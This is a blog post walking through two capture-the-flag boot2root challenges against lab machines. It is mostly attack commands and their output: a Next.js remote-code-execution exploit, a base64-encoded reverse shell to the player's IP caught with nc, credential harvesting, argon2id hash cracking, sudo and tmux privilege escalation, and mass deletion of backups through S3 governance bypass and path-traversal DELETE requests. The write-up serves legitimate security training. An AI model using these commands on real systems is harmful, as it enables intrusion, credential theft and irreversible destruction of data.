---
layout: post
title:  "Boot2Root Challenges"
date:   2026-11-20 01:09:00 -0400
author: uzi
tags: [CTF]
permalink: /platypwn-ctf-2026-boot2root/
---
* TOC
{:toc}

## Carbon

**Category**: fullpwn

**Description**: Platypus Freight lets its customers check their transport emissions in **Carbon**, a shiny new customer portal. The ops team says the box behind it was “cleaned up for SOC2” in September, and that no passwords are lying around anymore. Get a foothold through the portal, then work your way to root.

**Flags:** the user flag is in `/home/operator/user.txt`, the root flag in `/root/root.txt`.

Reverse shells to your own machine are allowed for this challenge.

I start the challenge instance and go to the website:

![Alt text](/images/platyweb1.png)

I notice they are running `Next.js 15.5.6`! This is vulnerable to `CVE-2025-55182`!

I went to [https://github.com/nehkark/CVE-2025-55182](https://github.com/nehkark/CVE-2025-55182) and downloaded the exploit poc script which allows you to execute remote code arbitrarily without authentication. The flaw allows attackers to execute code on vulnerable servers through insecure deserialization of malicious HTTP requests.

I test the exploit to make sure it works:
```shell
python3 poc-cve-2025-55182.py -u http://10.83.15.134:3000 -c "id"  
React2Shell PoC - CVE-2025-55182  
---------------------------------  
  
[+] Target URL : http://10.83.15.134:3000  
[+] Command    : id  
  
[+] Sending crafted Flight payload...  
[+] HTTP status: 500  
  
[✓] RCE confirmed. Command output:  
  
	uid=1001(nextjs) gid=1001(nextjs) groups=1001(nextjs)
```

I had some trouble getting a shell at first. I think it was some encoding issue. Using base64 I got a shell:
```shell
python3 poc-cve-2025-55182.py -u http://10.83.15.134:3000 -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44Mi4zLjE4Mi80NDQ0IDA+JjE= | base64 -d | bash"  
React2Shell PoC - CVE-2025-55182  
---------------------------------  
  
[+] Target URL : http://10.83.15.134:3000  
[+] Command    : echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44Mi4zLjE4Mi80NDQ0IDA+JjE= | base64 -d | bash  
  
[+] Sending crafted Flight payload...
```

```shell
nc -lvnp 4444  
Listening on 0.0.0.0 4444  
Connection received on 10.83.15.134 37554  
bash: cannot set terminal process group (16): Inappropriate ioctl for device  
bash: no job control in this shell  
nextjs@carbon-5cddcd57cb-brprp:/srv/portal$ id  
id  
uid=1001(nextjs) gid=1001(nextjs) groups=1001(nextjs)  
nextjs@carbon-5cddcd57cb-brprp:/srv/portal$
```

Running `env`:
```shell
HOSTNAME=0.0.0.0  
REPORT_QUEUE=reports:pending  
PWD=/srv/portal  
PORT=3000  
NODE_ENV=production  
NEXT_DEPLOYMENT_ID=  
HOME=/home/nextjs  
LANG=C.UTF-8  
LS_COLORS=  
__NEXT_PRIVATE_ORIGIN=http://localhost:3000  
SMTP_RELAY=mail.platypus-freight.internal:25  
USER=nextjs  
SHLVL=2  
REPORTING_DATABASE_URL=postgres://carbon_report:Tr33sAreN1ce!2025@reports-db.platypus-freight.internal:5432/carbon  
__NEXT_PROCESSED_ENV=true  
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
NEXT_TELEMETRY_DISABLED=1  
_=/usr/bin/env
```
Looks like theres some creds for the postgres database here.

I found `/opt/carbon/ops-notes.md`:
```shell
nextjs@carbon-5cddcd57cb-brprp:/$ cat /opt/carbon/ops-notes.md  
cat /opt/carbon/ops-notes.md  
# Carbon portal - ops notes  
  
Last edit: 2026-10-02 (mk)  
  
## Accounts on this box  
  
- `nextjs`: runs the portal (`/srv/portal/server.js`), no login, no sudo.  
- `operator`: ops account for maintenance (restarts, log pulls, env checks).  
  
## Where is the operator password?  
  
Not here, and not in `.env.local` any more. After the SOC2 cleanup the  
operator password is only handed out by the internal admin API, and only  
to someone holding a valid operator session.  
  
The ops dashboard keeps the current operator session token in the cache:  
  
- Redis: `127.0.0.1:6379` (no auth, internal only)  
- key: `session:operator`  
- tokens are short-lived (check `TTL session:operator`); the dashboard  
refreshes the key before it expires, so just read it again if it is gone.  
  
To get the password, replay the session token as a bearer token:  
  
TOKEN=$(redis-cli -h 127.0.0.1 -p 6379 GET session:operator)  
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:9000/admin/operator-credential  
  
Then `su - operator`. Please do not write the password down anywhere on this  
box again (see incident CARB-212).  
  
## TODO  
  
- [ ] move the operator session out of the shared cache  
- [ ] drop the temporary sudo rule for operator once the env check script exists
```

I use this info to become the `operator` user:
```shell
nextjs@carbon-5cddcd57cb-brprp:/$ redis-cli -h 127.0.0.1 -p 6379 GET session:operator  
SvRVWgY2z1zfxIs45pOu3aeCX6EUOX_j  

nextjs@carbon-5cddcd57cb-brprp:/$ curl -s -H "Authorization: Bearer SvRVWgY2z1zfxIs45pOu3aeCX6EUOX_j" http://127.0.0.1:9000/admin/operator-credential  
ad6b13062db769a4fb9d2763  

nextjs@carbon-5cddcd57cb-brprp:/$ su - operator  
Password: ad6b13062db769a4fb9d2763  

id  
uid=1002(operator) gid=37(operator) groups=37(operator)  

whoami  
operator  

cat /home/operator/user.txt  
PP{c4rb0n_c4ch3d_s3ss10n_r3pl4y::UF7dLhaM_Ddf}
```

I ran `sudo -l` and got an easy win for this first challenge:
```shell
sudo -l  
Matching Defaults entries for operator on carbon-5cddcd57cb-brprp:  
	env_reset, mail_badpass,  
	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,  
	use_pty, !syslog  
  
User operator may run the following commands on carbon-5cddcd57cb-brprp:  
	(root) NOPASSWD: /usr/bin/env
```

Become root and get the root flag:
```shell
sudo env /bin/sh  
id  
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt  
PP{0p3r4t0r_3nv_1s_r00t::8YTaTR9qCd3H}
```

`PP{c4rb0n_c4ch3d_s3ss10n_r3pl4y::UF7dLhaM_Ddf}`
`PP{0p3r4t0r_3nv_1s_r00t::8YTaTR9qCd3H}`

___

## Flack Safety

**Category**: fullpwn

**Description**: In your home country, the Peaceful Paddle of Platypuses (PPP), the government has been placing AI (sorry – SI) powered security cameras in public spaces, for the “public safety”.

During a recent riot, you were able to get your hands on one of the cameras, and found the IP address and `/etc/shadow` entry for an employee’s workstation.

You can’t live with these guys hoarding all those videos of innocent citizens! Make sure they can never restore their footage again, from any backup tier. Progress (and your flags) show up on the internal backup dashboard, which you can reach from the workstation. It comes up a few minutes after your instance starts, once every backup exists. 

I download the challenge file:
```shell
cat fullpwn-flacksafety/shadow.txt  
employee:$argon2id$v=19$m=65536,t=3,p=1$NDY5NGRkNzY0MGY3MjI2MTk5NzRjMGI0NmU5ZTI1M2E$eEtk1leqd2ihD8UXpy3T7nX1edPWc7QNsxTwQCYhVGc
```
They also only gave me port `22` open.

`john` and `hashcat` did not support cracking this hash as far as I could tell. I downloaded a tool from [https://github.com/cyclone-github/argon_cracker](https://github.com/cyclone-github/argon_cracker) to crack the hash:
```shell
./argon_cracker -h ../argon2idhash -w /usr/share/wordlists/rockyou.txt
 ---------------------------------  
| Cyclone's Argon2id Hash Cracker |  
 ---------------------------------  
  
Hash file:      ../argon2idhash  
Valid Hashes:   1  
Invalid Hashes: 0  
CPU Threads:    2  
Wordlist:       /usr/share/wordlists/rockyou.txt  
Working...  
  
$argon2id$v=19$m=65536,t=3,p=1$NDY5NGRkNzY0MGY3MjI2MTk5NzRjMGI0NmU5ZTI1M2E$eEtk1leqd2ihD8UXpy3T7nX1edPWc7QNsxTwQCYhVGc:iloveme  
  
Cracked:        1/1  
Hashrate:       18.22 h/s  
Runtime:        00h:00m:11s
```
I got the password `iloveme`!

Now I can ssh into the machine:
```shell
ssh employee@10.83.16.109  
The authenticity of host '10.83.16.109 (10.83.16.109)' can't be established.  
ED25519 key fingerprint is SHA256:+shQUZh2SH+Cd/5AwYWfTIh6GDqCmsC69aDvHjmhJA4.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.83.16.109' (ED25519) to the list of known hosts.  
employee@10.83.16.109's password:  
Welcome to Alpine!  
  
The Alpine Wiki contains a large amount of how-to guides and general  
information about administrating Alpine systems.  
See <https://wiki.alpinelinux.org/>.  
  
You can setup the system with the command: setup-alpine  
  
You may change this message by editing /etc/motd.  
  
backups-workstation-856d57c7f7-fqh7s:~$ id  
uid=1000(employee) gid=1000(employee) groups=1000(employee)  
backups-workstation-856d57c7f7-fqh7s:~$
```

I ran `ps aux`:
```shell
backups-workstation-856d57c7f7-fqh7s:~$ ps aux  
PID USER TIME COMMAND  
1 root 0:00 sshd: /usr/sbin/sshd -D -e [listener] 0 of 10-100 startups  
117 root 0:01 supercronic /etc/crontab  
129 root 0:00 {tmux: server} tmux -S /tmp/tmux-1000/default new-session -d -s ops cat /tmp/legacy.txt; rm /tmp/legacy.txt; exec bash  
130 root 0:00 bash  
2287 root 0:00 sshd-session: employee [priv]  
2291 employee 0:06 sshd-session: employee@pts/1  
2292 employee 0:00 -bash  
4493 employee 0:00 ps aux
```

There is a root tmux session! I ran `tmux -S /tmp/tmux-1000/default attach -t ops` and got a root session and was also able to view the deleted contents of `tmp/legacy.txt`:
```shell
$ rclone lsf -R --files-only legacy:  
config  
keys/831d5df2c2c6e7c0303bf609229777925b20c5c75382c1445c3c3f53dfa45f68  
snapshots/cfcfd932d90a649d28d7494af7e6e4423700273183c50ab9a25b02d585c94296  
index/f6539f960b8bd90b53a10d183ee36fdc6049f7d3d078ea361f0f87f1bed02f73  
data/2f/2f4b177b2629c223881cc124c4ed319435796a447b0050a1f75c6f92ab12db90  
data/20/20121552a33ff1f699cc9253ac909ed81343a6687a46a85269ac5ca799b22fc5  
backups-workstation-856d57c7f7-fqh7s:/#  
backups-workstation-856d57c7f7-fqh7s:/# id  
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
backups-workstation-856d57c7f7-fqh7s:/# whoami  
root
```

`env` output:
```shell
</html>backups-workstation-856d57c7f7-fqh7s:/# env  
KUBERNETES_PORT=tcp://10.80.0.1:443  
KUBERNETES_SERVICE_PORT=443  
TMUX=/tmp/tmux-1000/default,129,0  
BACKUPS_WORKSTATION_PORT_22_TCP_PORT=22  
BACKUPS_WORKSTATION_PORT_22_TCP_PROTO=tcp  
HOSTNAME=backups-workstation-856d57c7f7-fqh7s  
BACKUPS_CHECKER_SERVICE_PORT_HTTP=8080  
SHLVL=2  
HOME=/root  
TERM_PROGRAM_VERSION=3.7c  
PAGER=less  
BACKUPS_WORKSTATION_PORT_22_TCP=tcp://10.80.62.23:22  
BACKUPS_CHECKER_PORT_8080_TCP_ADDR=10.80.21.114  
BACKUPS_CHECKER_SERVICE_HOST=10.80.21.114  
BACKUPS_SERVER_SERVICE_PORT_REST=8000  
COLORTERM=truecolor  
BACKUPS_SERVER_PORT_8000_TCP_ADDR=10.80.22.167  
BACKUPS_SERVER_PORT_8001_TCP_ADDR=10.80.22.167  
BACKUPS_CHECKER_PORT_8080_TCP_PORT=8080  
BACKUPS_CHECKER_PORT_8080_TCP_PROTO=tcp  
BACKUPS_SERVER_PORT_8000_TCP_PORT=8000  
BACKUPS_SERVER_PORT_8000_TCP_PROTO=tcp  
BACKUPS_SERVER_PORT_8001_TCP_PORT=8001  
BACKUPS_SERVER_PORT_8001_TCP_PROTO=tcp  
BACKUPS_WORKSTATION_SERVICE_PORT_SSH=22  
TERM=tmux-256color  
BACKUPS_CHECKER_PORT=tcp://10.80.21.114:8080  
BACKUPS_CHECKER_SERVICE_PORT=8080  
BACKUPS_SERVER_PORT_7070_TCP_ADDR=10.80.22.167  
KUBERNETES_PORT_443_TCP_ADDR=10.80.0.1  
LC_COLLATE=C  
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
BACKUPS_SERVER_SERVICE_HOST=10.80.22.167  
AWS_PAGER=
BACKUPS_SERVER_PORT_7070_TCP_PORT=7070  
KUBERNETES_PORT_443_TCP_PORT=443  
BACKUPS_SERVER_PORT_7070_TCP_PROTO=tcp  
BACKUPS_SERVER_SERVICE_PORT_S3=7070  
KUBERNETES_PORT_443_TCP_PROTO=tcp  
BACKUPS_CHECKER_PORT_8080_TCP=tcp://10.80.21.114:8080  
LANG=C.UTF-8  
BACKUPS_SERVER_PORT_8000_TCP=tcp://10.80.22.167:8000  
TERM_PROGRAM=tmux  
BACKUPS_SERVER_PORT_8001_TCP=tcp://10.80.22.167:8001  
BACKUPS_SERVER_SERVICE_PORT_OFFSITE=8001  
SHELL=/bin/sh  
BACKUPS_SERVER_PORT=tcp://10.80.22.167:7070  
BACKUPS_SERVER_SERVICE_PORT=7070  
BACKUPS_WORKSTATION_SERVICE_HOST=10.80.62.23  
BACKUPS_SERVER_PORT_7070_TCP=tcp://10.80.22.167:7070  
KUBERNETES_PORT_443_TCP=tcp://10.80.0.1:443  
KUBERNETES_SERVICE_PORT_HTTPS=443  
KUBERNETES_SERVICE_HOST=10.80.0.1  
PWD=/  
SSH_CONNECTION=10.82.3.182 50560 10.83.16.109 22  
CHARSET=UTF-8  
BACKUPS_WORKSTATION_PORT=tcp://10.80.62.23:22  
BACKUPS_WORKSTATION_SERVICE_PORT=22  
TMUX_PANE=%1  
BACKUPS_WORKSTATION_PORT_22_TCP_ADDR=10.80.62.23
```

Looking at `/etc/resticprofile/profiles.yaml`:
```shell
backups-workstation-856d57c7f7-fqh7s:/# cat /etc/resticprofile/profiles.yaml
version: "2"

profiles:
base:
initialize: true
env:
RESTIC_PASSWORD: flack-footage
backup:
source: /home/employee/footage
host: workstation
skip-if-unchanged: true

local-user: # runs as employee
inherit: base
repository: local:/home/employee/backups

# The remote repositories get their credentials from root's cron environment.
local-root:
inherit: base
repository: local:/backups
offsite:
inherit: base
repository: rest:http://backups-server:8001/footage
rclone:
inherit: base
repository: rest:http://backups-server:8000/workstation/footage
s3:
inherit: base
repository: s3:http://backups-server:7070/footage

groups:
root:
continue-on-error: true
profiles:
- local-root
- offsite
- rclone
- s3
```

I start deleting their backups:
```shell
backups-workstation-856d57c7f7-fqh7s:/# rm -rf /home/employee/backups/*  
backups-workstation-856d57c7f7-fqh7s:/# rm -rf /backups/*
```

Looking at the internal private dashboard shows this is being tracked:
```shell
backups-workstation-856d57c7f7-fqh7s:/# curl -s http://backups-checker:8080/  
```

![Alt text](/images/platyweb2.png)

I deleted `S3 Governance` and `Rclone Remote 1` like this:
```shell
export AWS_PAGER="" 

export AWS_ACCESS_KEY_ID=flack 

export AWS_SECRET_ACCESS_KEY=flack-s3-secret

aws --endpoint-url http://backups-server:7070 s3api list-object-versions --bucket footage \ --query '{Objects: Versions[].{Key:Key,VersionId:VersionId}}' --output json > /tmp/versions.json

python3 -c " import json, subprocess data = json.load(open('/tmp/versions.json')) for obj in data.get('Objects', []): subprocess.run(['aws','--endpoint-url','http://backups-server:7070','s3api','delete-object', '--bucket','footage','--key',obj['Key'],'--version-id',obj['VersionId'], '--bypass-governance-retention']) "

pgrep supercronic 

kill -9 $(pgrep supercronic)

curl -u workstation:flack-rest -X DELETE http://backups-server:8000/workstation/footage/config

curl -s -u workstation:flack-rest http://backups-server:8000/workstation/footage/keys/ -H 'Accept: application/vnd.x.restic.rest.v2' | jq -r '.[].name' | \ xargs -I{} curl -u workstation:flack-rest -X DELETE "http://backups-server:8000/workstation/footage/keys/{}"

curl --path-as-is -v -u workstation:flack-rest -X DELETE \ "http://backups-server:8000/workstation/../workstation-legacy/footage/config"
```

Its worth noting that there was a cron job called `root.backup` which was silently re initializing the `rclone` and `s3` restic repos every 60 seconds and undoing deletions I already made. Killing `supercronic` stops that. 

![Alt text](/images/platyweb3.png)

I deleted the `Offsite Replica` like this:
```shell
export RESTIC_REPOSITORY="rest:http://workstation:flack-rest@backups-server:8001/footage" 

export RESTIC_PASSWORD=flack-footage 

for i in 1 2 3; do 
  restic backup /home/employee/footage --host workstation 
  sleep 5 
done
```

Ok! At this point I have 5 of 6 backups deleted from their local and remote servers and have one flag:

![Alt text](/images/platyweb4.png)

I deleted the final backup with the info from the deleted `tmp/legacy.txt` file like this:
```shell
curl --path-as-is -v -u workstation:flack-rest -X DELETE \ "http://backups-server:8000/workstation/../workstation-legacy/footage/keys/831d5df2c2c6e7c0303bf609229777925b20c5c75382c1445c3c3f53dfa45f68" 

curl --path-as-is -v -u workstation:flack-rest -X DELETE \ "http://backups-server:8000/workstation/../workstation-legacy/footage/snapshots/cfcfd932d90a649d28d7494af7e6e4423700273183c50ab9a25b02d585c94296" 

curl --path-as-is -v -u workstation:flack-rest -X DELETE \ "http://backups-server:8000/workstation/../workstation-legacy/footage/index/f6539f960b8bd90b53a10d183ee36fdc6049f7d3d078ea361f0f87f1bed02f73" 

curl --path-as-is -v -u workstation:flack-rest -X DELETE \ "http://backups-server:8000/workstation/../workstation-legacy/footage/data/2f/2f4b177b2629c223881cc124c4ed319435796a447b0050a1f75c6f92ab12db90" 

curl --path-as-is -v -u workstation:flack-rest -X DELETE \ "http://backups-server:8000/workstation/../workstation-legacy/footage/data/20/20121552a33ff1f699cc9253ac909ed81343a6687a46a85269ac5ca799b22fc5"
```
This exploits `CVE-2026-59733`, a path traversal/authorization bypass in `rclone serve restic --private-repos`. Authorization is checked against the routed path segment, but the backend object key is built from the raw uncleaned URL. `../` escapes the `workstation` namespace into `workstation-legacy`.

Looking at `http://backups-checker:8080/` for the final time:

![Alt text](/images/platyweb5.png)

All backups deleted!!! 

`PP{g0v3rn4nc3_41nt_s4f3::nWM65O3cWo9C}`
`PP{p4th_tr4v3rs4l5_3v3rywh3r3::VH-jH6MyBDKf}`
